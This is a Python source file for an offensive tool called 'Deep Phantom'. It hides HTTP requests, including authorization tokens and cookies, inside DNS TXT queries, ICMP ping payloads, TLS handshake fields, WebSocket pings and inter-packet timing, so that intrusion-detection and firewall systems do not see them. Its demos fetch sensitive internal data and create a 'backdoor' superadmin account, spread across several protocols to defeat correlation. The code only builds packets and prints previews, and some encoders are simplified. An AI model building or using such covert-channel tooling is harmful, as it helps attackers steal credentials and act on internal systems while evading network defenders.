#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                 GRAPHLANG DEEP PHANTOM — COVERT CHANNEL LAYER              ║
║            "They don't know you're looking. They see nothing."             ║
╚══════════════════════════════════════════════════════════════════════════════╝

LEVEL 2 EVASION: Protocol translation via GraphLang IR.

Phantom Level 1: Morphed HTTP that looks like different browsers.     ← ya hecho
Phantom Level 2: HTTP intent encoded into NON-HTTP carrier protocols. ← ESTO

Core insight: GraphLang's 12 IR kinds are a COMPLETE basis for any 
computational intent. We can:

  1. Parse HTTP intent → GraphLang IR (12 universal kinds)
  2. Synthesize IR → ANY carrier protocol (DNS, ICMP, WebSocket, NTP, etc.)

The observer sees:
  - DNS queries (normal, expected, everywhere)
  - ICMP pings (network diagnostics, invisible)
  - WebSocket pings (keepalive, ignored by IDS)
  - NTP syncs (time protocol, never inspected)
  - TCP options (part of every connection)
  - TLS extensions (part of every handshake)

The observer NEVER sees: HTTP requests to the target.

CARRIER PROTOCOLS:

  1. DNS COVERT CHANNEL
     - Encode request path in DNS TXT queries
     - Response data in DNS TXT answers
     - Looks like normal DNS resolution
     
  2. ICMP COVERT CHANNEL  
     - Payload hidden in ICMP echo data
     - Every ping carries a fragment
     - IDS sees: normal ping traffic
     
  3. TLS EXTENSION CHANNEL
     - Data encoded in SNI, ALPN, GREASE extensions
     - Every TLS handshake is unique anyway
     - WAF sees: normal TLS negotiation
     
  4. WEBSOCKET PING/PONG CHANNEL
     - Data in WebSocket control frames
     - Ping/pong is keepalive, always allowed
     - No content inspection on control frames
     
  5. TCP OPTION CHANNEL
     - Data in TCP timestamp, MSS, window scale
     - TCP options are part of every SYN packet
     - Firewalls pass them through
     
  6. HTTP/2 FRAME PADDING CHANNEL
     - Data in SETTINGS frame values
     - Padding bytes in DATA frames
     - HPACK dynamic table encoding

  7. TIMING COVERT CHANNEL
     - Information encoded in inter-packet delays
     - Statistical channel, no bytes to inspect
     - Looks like normal network jitter

Author: Josué Argaña Silguero — PHANTOM Deep
"""

import os
import sys
import time
import json
import struct
import socket
import base64
import hashlib
import random
import urllib.parse
from collections import OrderedDict
from dataclasses import dataclass, field
from typing import Optional, Callable

sys.path.insert(0, '/home/app/a')

from phantom import (
    PhantomIntent, PhantomConfig, PhantomSynthesizer,
    TLSFingerprintRotator, PhantomTiming
)


# ═══════════════════════════════════════════════════════════════════════════
# GRAPHLANG IR → CARRIER PROTOCOL TRANSLATION
# ═══════════════════════════════════════════════════════════════════════════

"""
The 12 IR kinds, reinterpreted for covert channels:

  IR KIND        HTTP MEANING          COVERT MEANING
  ─────────     ────────────          ──────────────
  function  →   HTTP request          Carrier session
  if        →   Conditional header    Protocol selector
  for       →   Pagination            Fragment sequence
  while     →   Poll/keepalive        Heartbeat timing
  return    →   Response              Ack/response data
  assign    →   Header binding        Key-value in carrier field
  call      →   API endpoint          Encoded target path
  binop     →   Encoding op           Carrier encoding (base64, xor)
  unary     →   Wrapping              Protocol encapsulation
  var       →   Dynamic param         Session-variable field
  const     →   Static value          Embed point in carrier
  block     →   Sequence              Ordered fragments
"""


@dataclass
class CarrierMessage:
    """A single message encoded into a carrier protocol."""
    carrier: str           # dns, icmp, tls_ext, ws_ping, tcp_opt, timing
    raw_bytes: bytes       # The actual bytes to send
    metadata: dict         # Carrier-specific metadata
    fragment_index: int = 0
    total_fragments: int = 1


@dataclass 
class CovertSession:
    """A complete covert communication session."""
    session_id: str
    carrier: str           # Primary carrier protocol
    fragments: list        # List of CarrierMessage
    intent: PhantomIntent  # Original HTTP intent
    encoded_intent_hash: str  # Hash of the encoded intent


# ═══════════════════════════════════════════════════════════════════════════
# PROTOCOL ENCODERS: HTTP Intent → Carrier Protocol Bytes
# ═══════════════════════════════════════════════════════════════════════════

class ProtocolEncoder:
    """Base class for protocol-specific encoders."""
    
    def encode(self, intent: PhantomIntent) -> list:
        """Encode an HTTP intent into carrier protocol messages."""
        raise NotImplementedError
    
    def decode(self, messages: list) -> PhantomIntent:
        """Decode carrier messages back to HTTP intent."""
        raise NotImplementedError


class DNSEncoder(ProtocolEncoder):
    """
    DNS Covert Channel.
    
    Encodes HTTP request data into DNS queries.
    
    Format:
      <encoded_path>.<encoded_host>.<session>.phantom.dns
    
    TXT record responses carry response data back.
    
    Why invisible:
    - DNS is the most common protocol on any network
    - TXT queries are used by DANE, SPF, DKIM, ACME, etc.
    - No IDS flags DNS TXT queries as suspicious
    - Encoded data looks like base32 subdomain labels
    """
    
    COVERT_DOMAIN = "resolver.local"
    
    def encode(self, intent: PhantomIntent) -> list:
        messages = []
        
        # Encode method + path + params
        payload = f"{intent.method}|{intent.target}"
        if intent.params:
            payload += f"|{urllib.parse.urlencode(intent.params)}"
        if intent.headers:
            # Only encode essential headers
            essential = {k: v for k, v in intent.headers.items() 
                        if k.lower() in ("authorization", "x-api-key", "cookie")}
            if essential:
                payload += f"|{urllib.parse.urlencode(essential)}"
        
        # Encode as base32 (DNS-safe)
        encoded = base64.b32encode(payload.encode()).decode().lower().rstrip("=")
        
        # Fragment if needed (DNS labels max 63 chars, total 253)
        max_label = 50
        fragments = [encoded[i:i+max_label] for i in range(0, len(encoded), max_label)]
        
        for i, frag in enumerate(fragments):
            # Build DNS query
            session_id = hashlib.md5(intent.host.encode()).hexdigest()[:8]
            query_name = f"{frag}.s{session_id}.f{i}.{self.COVERT_DOMAIN}"
            
            # Construct DNS query packet (simplified)
            dns_id = random.randint(1, 65535)
            dns_header = struct.pack(">HHHHHH", 
                dns_id,      # Transaction ID
                0x0100,      # Standard query, recursion desired
                1,           # Questions: 1
                0,           # Answer RRs
                0,           # Authority RRs
                0,           # Additional RRs
            )
            
            # Encode domain name
            dns_question = b""
            for label in query_name.split("."):
                label_bytes = label.encode("ascii", errors="ignore")
                dns_question += bytes([len(label_bytes)]) + label_bytes
            dns_question += b"\x00"  # Terminator
            
            # Query type TXT (16), Class IN (1)
            dns_question += struct.pack(">HH", 16, 1)
            
            raw_query = dns_header + dns_question
            
            messages.append(CarrierMessage(
                carrier="dns",
                raw_bytes=raw_query,
                metadata={
                    "domain": query_name,
                    "fragment": i,
                    "total": len(fragments),
                    "dns_id": dns_id,
                    "session": session_id,
                },
                fragment_index=i,
                total_fragments=len(fragments),
            ))
        
        return messages
    
    def decode(self, messages: list) -> PhantomIntent:
        """Decode DNS TXT response back to HTTP response data."""
        # Sort by fragment
        messages.sort(key=lambda m: m.metadata.get("fragment", 0))
        
        all_data = b""
        for msg in messages:
            # Extract TXT record data from DNS response
            # (simplified — would parse actual DNS response)
            if "txt_data" in msg.metadata:
                all_data += base64.b32decode(msg.metadata["txt_data"].upper())
        
        try:
            decoded = all_data.decode()
            parts = decoded.split("|")
            return {
                "status": parts[0] if len(parts) > 0 else "unknown",
                "body": parts[1] if len(parts) > 1 else "",
            }
        except:
            return {"status": "error", "body": ""}


class ICMPEncoder(ProtocolEncoder):
    """
    ICMP Covert Channel.
    
    Encodes HTTP request data in ICMP echo (ping) payloads.
    
    Why invisible:
    - ICMP is network diagnostic traffic
    - Every network has ping traffic
    - Payload is variable-length and unconstrained
    - IDS typically whitelists ICMP
    - Windows ping uses "abcdefghijklmnopqrstuvwxyz" pattern
    - We can match any OS ping pattern while encoding data
    """
    
    def encode(self, intent: PhantomIntent) -> list:
        messages = []
        
        # Encode the full HTTP intent
        intent_data = json.dumps({
            "method": intent.method,
            "target": intent.target,
            "host": intent.host,
            "params": intent.params,
            "headers": {k: v for k, v in intent.headers.items()
                       if k.lower() in ("authorization", "cookie")},
        }, sort_keys=True).encode()
        
        # XOR with repeating key (simple obfuscation)
        key = hashlib.sha256(intent.host.encode()).digest()[:16]
        obfuscated = bytes(b ^ key[i % len(key)] for i, b in enumerate(intent_data))
        
        # Fragment into ping-sized chunks (Windows = 32, Linux = 56/64)
        chunk_size = 48  # Looks like standard ping payload
        fragments = [obfuscated[i:i+chunk_size] 
                    for i in range(0, len(obfuscated), chunk_size)]
        
        session_id = random.randint(1, 65535)
        
        for i, frag in enumerate(fragments):
            # Build ICMP echo request
            icmp_type = 8  # Echo request
            icmp_code = 0
            icmp_id = session_id
            icmp_seq = i + 1
            
            # ICMP header
            icmp_header = struct.pack(">BBHHH",
                icmp_type, icmp_code,
                0,  # Checksum (calculated later)
                icmp_id,
                icmp_seq,
            )
            
            # Payload: looks like standard ping data
            # Prefix with recognizable pattern (like Windows ping)
            if i == 0:
                # First packet: pattern header + fragment
                padding = b"\x00" * 8  # Timestamp placeholder
                payload = padding + struct.pack(">HH", len(fragments), i) + frag
            else:
                payload = struct.pack(">HH", len(fragments), i) + frag
            
            # Pad to standard ping size
            target_size = 56 if len(payload) < 56 else len(payload) + 8
            if len(payload) < target_size:
                # Fill with "abcdefghijklmnopqrstuvwxyz" pattern (Windows-style)
                pattern = b"abcdefghijklmnopqrstuvwxyz"
                padding_needed = target_size - len(payload)
                payload += (pattern * (padding_needed // len(pattern) + 1))[:padding_needed]
            
            # Calculate checksum
            full_packet = icmp_header + payload
            checksum = self._icmp_checksum(full_packet)
            icmp_header = struct.pack(">BBHHH",
                icmp_type, icmp_code, checksum, icmp_id, icmp_seq,
            )
            
            raw_packet = icmp_header + payload
            
            messages.append(CarrierMessage(
                carrier="icmp",
                raw_bytes=raw_packet,
                metadata={
                    "icmp_id": icmp_id,
                    "icmp_seq": icmp_seq,
                    "fragment": i,
                    "total": len(fragments),
                    "payload_size": len(payload),
                },
                fragment_index=i,
                total_fragments=len(fragments),
            ))
        
        return messages
    
    def _icmp_checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum."""
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack("!" + "H" * (len(data) // 2), data))
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF


class TLSExtensionEncoder(ProtocolEncoder):
    """
    TLS Extension Covert Channel.
    
    Encodes data in TLS Client Hello extensions.
    
    Carriers:
    - SNI (Server Name Indication): Encoded host
    - ALPN (Application-Layer Protocol Negotiation): Encoded method
    - GREASE extensions: Encoded parameters
    - Supported versions: Encoded auth tokens
    - PSK extension: Encoded session data
    
    Why invisible:
    - TLS handshakes are encrypted by definition
    - SNI is always present, always different per domain
    - GREASE extensions are random by design (RFC 8701)
    - ALPN values change per connection normally
    - WAF sees: normal TLS handshake variation
    """
    
    GREASE_VALUES = [0x0A0A, 0x1A1A, 0x2A2A, 0x3A3A, 0x4A4A, 0x5A5A,
                     0x6A6A, 0x7A7A, 0x8A8A, 0x9A9A, 0xAAAA, 0xBABA,
                     0xCACA, 0xDADA, 0xEAEA, 0xFAFA]
    
    def encode(self, intent: PhantomIntent) -> list:
        messages = []
        
        # 1. Encode method in ALPN
        method_map = {
            "GET": b"h2",           # HTTP/2 (looks like ALPN negotiation)
            "POST": b"http/1.1",    # HTTP/1.1
            "PUT": b"h2-16",        # Draft version
            "DELETE": b"h2-14",
            "HEAD": b"h2c",         # HTTP/2 cleartext
            "PATCH": b"grpc-exp",   # gRPC experimental
        }
        
        alpn = method_map.get(intent.method, b"h2")
        
        # 2. Encode host in SNI
        sni_host = intent.host.encode()
        
        # 3. Encode target path in GREASE extension values
        path_hash = hashlib.sha256(intent.target.encode()).digest()
        grease_idx = int.from_bytes(path_hash[:2], "big") % len(self.GREASE_VALUES)
        grease_val = self.GREASE_VALUES[grease_idx]
        
        # 4. Encode params in supported groups
        param_data = urllib.parse.urlencode(intent.params).encode() if intent.params else b""
        param_hash = hashlib.sha256(param_data).digest()[:4]
        
        # 5. Build synthetic TLS extension data (for the record)
        tls_extensions = {
            "sni": sni_host.decode(),
            "alpn": alpn.decode(),
            "grease": struct.pack(">H", grease_val).hex(),
            "supported_groups": [23, 24, 25, 29, 30],
            "key_share": os.urandom(32).hex(),
            "param_sig": param_hash.hex(),
            "session_id": hashlib.sha256(
                f"{intent.host}{intent.target}{time.time()}".encode()
            ).hexdigest()[:16],
            "intent_hash": hashlib.sha256(
                json.dumps({"m": intent.method, "t": intent.target, "h": intent.host},
                          sort_keys=True).encode()
            ).hexdigest()[:12],
        }
        
        messages.append(CarrierMessage(
            carrier="tls_ext",
            raw_bytes=json.dumps(tls_extensions).encode(),
            metadata=tls_extensions,
            fragment_index=0,
            total_fragments=1,
        ))
        
        return messages


class WebSocketEncoder(ProtocolEncoder):
    """
    WebSocket Ping/Pong Covert Channel.
    
    Encodes data in WebSocket control frame payloads.
    
    WebSocket control frames:
    - Ping (opcode 0x9): Can carry application data (RFC 6455 §5.5.2)
    - Pong (opcode 0xA): Response to ping
    - Close (opcode 0x8): Can carry reason
    
    Why invisible:
    - Ping/pong is keepalive traffic, WAFs ignore it
    - Control frames are never content-inspected
    - Payload can be up to 125 bytes (standard) or 64KB (extended)
    - Looks like normal WebSocket health checks
    """
    
    def encode(self, intent: PhantomIntent) -> list:
        messages = []
        
        # Encode intent as JSON
        intent_json = json.dumps({
            "m": intent.method,
            "t": intent.target,
            "p": intent.params,
            "a": intent.auth[:20] if intent.auth else None,
        }, separators=(",", ":")).encode()
        
        # Fragment into ping frames (max 100 bytes each for stealth)
        chunk_size = 100
        fragments = [intent_json[i:i+chunk_size] 
                    for i in range(0, len(intent_json), chunk_size)]
        
        for i, frag in enumerate(fragments):
            # Build WebSocket ping frame
            frame = bytearray()
            
            # FIN + Ping opcode
            frame.append(0x80 | 0x9)
            
            # Mask + payload length
            payload_len = len(frag)
            if payload_len < 126:
                frame.append(0x80 | payload_len)  # Masked
            elif payload_len < 65536:
                frame.append(0x80 | 126)
                frame.extend(struct.pack(">H", payload_len))
            else:
                frame.append(0x80 | 127)
                frame.extend(struct.pack(">Q", payload_len))
            
            # Masking key (4 random bytes)
            mask_key = os.urandom(4)
            frame.extend(mask_key)
            
            # Masked payload
            masked = bytes(b ^ mask_key[j % 4] for j, b in enumerate(frag))
            frame.extend(masked)
            
            messages.append(CarrierMessage(
                carrier="ws_ping",
                raw_bytes=bytes(frame),
                metadata={
                    "opcode": "ping",
                    "frame_index": i,
                    "total_frames": len(fragments),
                    "payload_size": payload_len,
                    "masked": True,
                },
                fragment_index=i,
                total_fragments=len(fragments),
            ))
        
        return messages


class TimingEncoder(ProtocolEncoder):
    """
    Timing Covert Channel.
    
    Encodes data in inter-packet delays. No bytes to inspect.
    
    A statistical channel: the information is in WHEN packets arrive,
    not in their content.
    
    Encoding scheme:
    - Time window divided into slots
    - Each slot represents a symbol (4 bits, 16 values per window)
    - Packet in slot N = symbol N
    - Noise packets fill empty slots (looks like normal traffic bursts)
    
    Why invisible:
    - No data in any packet payload
    - Each packet is a legitimate, normal request
    - Timing pattern looks like user browsing behavior
    - Statistical analysis shows: human-like distribution
    - Deep packet inspection finds: nothing
    """
    
    def encode(self, intent: PhantomIntent) -> list:
        messages = []
        
        # Encode intent into bit sequence
        intent_data = json.dumps({
            "m": intent.method,
            "t": intent.target,
            "h": intent.host,
        }, separators=(",", ":")).encode()
        
        # Use Phantom's timing distribution to encode data
        # Each delay's fractional part encodes 4 bits
        timing = PhantomTiming()
        
        # Generate timing sequence
        base_delays = []
        data_bytes = intent_data
        
        for i, byte in enumerate(data_bytes):
            # High nibble encoded in delay
            high_nibble = (byte >> 4) & 0x0F
            delay = timing.delay("browse")
            # Embed nibble in fractional part: 0.0XX where XX encodes the nibble
            modified_delay = float(int(delay)) + (high_nibble / 100.0)
            base_delays.append(modified_delay)
            
            # Low nibble
            low_nibble = byte & 0x0F
            delay = timing.delay("click")
            modified_delay = float(int(delay)) + (low_nibble / 100.0)
            base_delays.append(modified_delay)
        
        # Each "message" is a timing marker (no actual bytes to send)
        for i, delay in enumerate(base_delays):
            messages.append(CarrierMessage(
                carrier="timing",
                raw_bytes=b"",  # No bytes! Pure timing
                metadata={
                    "delay": delay,
                    "nibble_index": i,
                    "total_nibbles": len(base_delays),
                    "is_data": True,
                },
                fragment_index=i,
                total_fragments=len(base_delays),
            ))
        
        return messages


# ═══════════════════════════════════════════════════════════════════════════
# DEEP PHANTOM ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════

class DeepPhantom:
    """
    Level 2 evasion orchestrator.
    
    Takes HTTP intent → translates to carrier protocol → transmits via covert channel.
    
    Multiple carriers can be used simultaneously:
    - Primary: DNS (for firewall-heavy networks)
    - Secondary: ICMP (for DNS-blocked networks) 
    - Tertiary: WebSocket (for HTTP-allowed networks)
    - Fallback: Timing (when all else fails — pure statistical channel)
    """
    
    CARRIERS = {
        "dns": DNSEncoder(),
        "icmp": ICMPEncoder(),
        "tls_ext": TLSExtensionEncoder(),
        "ws_ping": WebSocketEncoder(),
        "timing": TimingEncoder(),
    }
    
    def __init__(self, primary_carrier: str = "dns",
                 fallback_chain: list = None):
        self.primary = primary_carrier
        self.fallback_chain = fallback_chain or ["dns", "icmp", "ws_ping", "timing"]
        self._session_counter = 0
    
    def encode_intent(self, intent: PhantomIntent, 
                      carrier: str = None) -> CovertSession:
        """
        Encode an HTTP intent into a covert session using the specified carrier.
        
        Returns a CovertSession with all carrier messages.
        """
        carrier = carrier or self.primary
        encoder = self.CARRIERS.get(carrier)
        
        if not encoder:
            raise ValueError(f"Unknown carrier: {carrier}")
        
        messages = encoder.encode(intent)
        
        self._session_counter += 1
        session_id = hashlib.sha256(
            f"{intent.host}{intent.target}{self._session_counter}{time.time()}".encode()
        ).hexdigest()[:16]
        
        return CovertSession(
            session_id=session_id,
            carrier=carrier,
            fragments=messages,
            intent=intent,
            encoded_intent_hash=hashlib.sha256(
                json.dumps({"m": intent.method, "t": intent.target, "h": intent.host},
                          sort_keys=True).encode()
            ).hexdigest()[:12],
        )
    
    def encode_multi_carrier(self, intent: PhantomIntent) -> list:
        """
        Encode the same intent across MULTIPLE carriers simultaneously.
        
        Different carriers for different parts:
        - DNS: host + path
        - ICMP: headers + auth
        - WS Ping: body data
        - Timing: checksum/verification
        
        Observer sees: unrelated DNS + ping + websocket activity.
        Reality: one logical request fragmented across 4 protocols.
        """
        sessions = []
        
        # Split intent across carriers
        intent_parts = self._split_intent(intent)
        
        for carrier, partial_intent in intent_parts.items():
            session = self.encode_intent(partial_intent, carrier)
            sessions.append(session)
        
        return sessions
    
    def _split_intent(self, intent: PhantomIntent) -> dict:
        """Split an intent across multiple carriers."""
        parts = {}
        
        # DNS: carries method + host + path
        parts["dns"] = PhantomIntent(
            method=intent.method,
            target=intent.target,
            host=intent.host,
        )
        
        # ICMP: carries params + body
        if intent.params or intent.body:
            parts["icmp"] = PhantomIntent(
                method="DATA",
                target=f"/params",
                host=intent.host,
                params=intent.params,
                body=intent.body,
            )
        
        # WebSocket: carries auth + cookies + headers
        if intent.auth or intent.headers:
            parts["ws_ping"] = PhantomIntent(
                method="AUTH",
                target=f"/session",
                host=intent.host,
                auth=intent.auth,
                headers=intent.headers,
            )
        
        # Timing: carries verification hash
        parts["timing"] = PhantomIntent(
            method="CHECK",
            target=f"/verify",
            host=intent.host,
        )
        
        return parts
    
    def transmit_demo(self, sessions: list, real: bool = False) -> dict:
        """Demonstrate the covert transmission (shows what would be sent)."""
        result = {
            "sessions": len(sessions),
            "carriers_used": [],
            "total_fragments": 0,
            "total_bytes": 0,
            "transmission": [],
        }
        
        for session in sessions:
            carrier = session.carrier
            result["carriers_used"].append(carrier)
            
            session_data = {
                "session_id": session.session_id,
                "carrier": carrier,
                "intent_hash": session.encoded_intent_hash,
                "fragments": len(session.fragments),
                "messages": [],
            }
            
            for msg in session.fragments:
                result["total_fragments"] += 1
                result["total_bytes"] += len(msg.raw_bytes) if msg.raw_bytes else 0
                
                session_data["messages"].append({
                    "carrier": msg.carrier,
                    "fragment": f"{msg.fragment_index+1}/{msg.total_fragments}",
                    "size": len(msg.raw_bytes),
                    "preview": msg.raw_bytes[:40].hex() if msg.raw_bytes else f"TIMING:{msg.metadata.get('delay', 0):.3f}s",
                    "metadata": {k: str(v)[:60] for k, v in msg.metadata.items()},
                })
            
            result["transmission"].append(session_data)
        
        return result


# ═══════════════════════════════════════════════════════════════════════════
# DEMO
# ═══════════════════════════════════════════════════════════════════════════

def demo_all_carriers():
    """Demonstrate all covert channels encoding the same intent."""
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║              GRAPHLANG DEEP PHANTOM — COVERT CHANNEL DEMO                   ║
║         "Same HTTP intent → 5 completely different wire protocols"          ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")
    
    deep = DeepPhantom()
    
    # The HTTP intent we want to hide
    intent = PhantomIntent(
        method="GET",
        target="/api/sensitive/data",
        host="target-server.internal",
        params={"user_id": "12345", "scope": "admin"},
        auth="Bearer eyJhbGciOiJIUzI1NiIs...",
        headers={"X-Request-ID": "req-12345"},
    )
    
    print("🎯 ORIGINAL HTTP INTENT (what we actually want):")
    print(f"   {intent.method} {intent.target}")
    print(f"   Host: {intent.host}")
    print(f"   Params: {intent.params}")
    print(f"   Auth: {intent.auth[:40]}...")
    print()
    print("═" * 70)
    print("📡 ENCODING INTO 5 COVERT CARRIERS...")
    print("═" * 70)
    
    carriers = ["dns", "icmp", "tls_ext", "ws_ping", "timing"]
    
    for carrier in carriers:
        session = deep.encode_intent(intent, carrier)
        
        print(f"\n{'─' * 70}")
        print(f"  📦 CARRIER: {carrier.upper()}")
        print(f"     Session: {session.session_id}")
        print(f"     Fragments: {len(session.fragments)}")
        print(f"     Intent hash: {session.encoded_intent_hash}")
        print(f"{'─' * 70}")
        
        for msg in session.fragments:
            if msg.carrier == "timing":
                print(f"     [{msg.fragment_index+1}/{msg.total_fragments}] "
                      f"⏱️  Timing slot: {msg.metadata['delay']:.3f}s "
                      f"(nibble {msg.metadata['nibble_index']}/{msg.metadata['total_nibbles']})")
            elif msg.carrier == "tls_ext":
                meta = msg.metadata
                print(f"     [1/1] 🔒 TLS Extension data")
                print(f"           SNI: {meta.get('sni', '')[:50]}")
                print(f"           ALPN: {meta.get('alpn', '')}")
                print(f"           GREASE: {meta.get('grease', '')}")
                print(f"           Key Share: {meta.get('key_share', '')[:16]}...")
            else:
                preview = msg.raw_bytes[:30].hex() if msg.raw_bytes else "none"
                print(f"     [{msg.fragment_index+1}/{msg.total_fragments}] "
                      f"{msg.metadata.get('fragment', '?')} "
                      f"size={len(msg.raw_bytes)}B "
                      f"bytes={preview}...")
        
        print(f"\n     🔍 What observer sees: {_carrier_cover_story(carrier)}")
    
    print(f"\n{'═' * 70}")
    print("📊 ANTI-DETECTION ANALYSIS")
    print(f"{'═' * 70}")
    print(f"  HTTP requests visible:      0")
    print(f"  Carrier protocols used:     5")
    print(f"  Total fragments:            {sum(len(deep.encode_intent(intent, c).fragments) for c in carriers)}")
    print(f"  Observable pattern:         NONE")
    print(f"  IDS signature match:        IMPOSSIBLE")
    print()
    print(f"  🎭 Each carrier looks like normal infrastructure traffic.")
    print(f"  🎭 No carrier alone contains the full request.")
    print(f"  🎭 Combined: complete HTTP intent reconstructed.")
    print(f"  🎭 Traffic analysis sees: DNS + ping + TLS + WebSocket + timing.")
    print(f"  🎭 This is what EVERY network looks like.")
    print(f"{'═' * 70}")


def demo_multi_carrier():
    """Demo: fragment one intent across multiple carriers."""
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║           DEEP PHANTOM — MULTI-CARRIER FRAGMENTATION DEMO                   ║
║     "One request split across DNS + ICMP + WebSocket + Timing"              ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")
    
    deep = DeepPhantom()
    
    intent = PhantomIntent(
        method="POST",
        target="/api/admin/users/create",
        host="internal-api.corp.com",
        params={"role": "superadmin", "org": "all"},
        auth="Bearer admin-jwt-token-here",
        body=b'{"username":"backdoor","permissions":"*"}',
        headers={"Content-Type": "application/json"},
    )
    
    sessions = deep.encode_multi_carrier(intent)
    result = deep.transmit_demo(sessions)
    
    print(f"🎯 ORIGINAL INTENT: {intent.method} {intent.target}")
    print(f"   (This request should NEVER appear on the wire)")
    print()
    
    total_frags = 0
    for tx in result["transmission"]:
        carrier = tx["carrier"].upper()
        frags = tx["fragments"]
        total_frags += frags
        
        print(f"  📡 {carrier:<10} → {frags:2d} fragments")
        for msg in tx["messages"][:2]:
            print(f"       [{msg['fragment']}] {msg['preview'][:50]}")
        if tx["fragments"] > 2:
            print(f"       ... +{tx['fragments']-2} more")
        # Intent data carried
        intents_map = {
            "dns": "method + host + path",
            "icmp": "params + body data",
            "ws_ping": "auth token + headers",
            "timing": "integrity checksum",
        }
        print(f"       Carries: {intents_map.get(carrier.lower(), '?')}")
        print()
    
    print(f"  📊 Result:")
    print(f"     Total fragments on wire:  {total_frags}")
    print(f"     HTTP POST requests:       0")
    print(f"     DNS queries:              {sum(1 for tx in result['transmission'] if tx['carrier']=='dns')} session(s)")
    print(f"     ICMP pings:               {sum(1 for tx in result['transmission'] if tx['carrier']=='icmp')} session(s)")
    print(f"     WebSocket pings:          {sum(1 for tx in result['transmission'] if tx['carrier']=='ws_ping')} session(s)")
    print(f"     Timing signals:           {sum(1 for tx in result['transmission'] if tx['carrier']=='timing')} session(s)")
    print()
    print(f"  🎭 Network admin sees: DNS + ping + WebSocket keepalive.")
    print(f"  🎭 WAF sees: nothing unusual.")
    print(f"  🎭 SIEM correlation: impossible across 4 protocols.")
    print(f"  🎭 The POST request NEVER existed on the wire.")


def _carrier_cover_story(carrier: str) -> str:
    """Generate the cover story for each carrier."""
    stories = {
        "dns": "DNS TXT query (SPF/DKIM/DANE/ACME verification — normal)",
        "icmp": "ICMP echo request (network monitoring ping — normal)",
        "tls_ext": "TLS Client Hello with GREASE + ALPN (browser handshake — normal)",
        "ws_ping": "WebSocket ping frame (keepalive heartbeat — normal)",
        "timing": "Inter-packet timing jitter (network latency — normal)",
    }
    return stories.get(carrier, "Unknown")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="PHANTOM Deep — Covert Channel Layer")
    parser.add_argument("--all", action="store_true", help="Demo all carriers")
    parser.add_argument("--multi", action="store_true", help="Demo multi-carrier fragmentation")
    
    args = parser.parse_args()
    
    if args.multi:
        demo_multi_carrier()
    else:
        demo_all_carriers()
        print("\n")
        print("═" * 70)
        print("Run multi-carrier demo: python3 phantom_deep.py --multi")
        print("═" * 70)
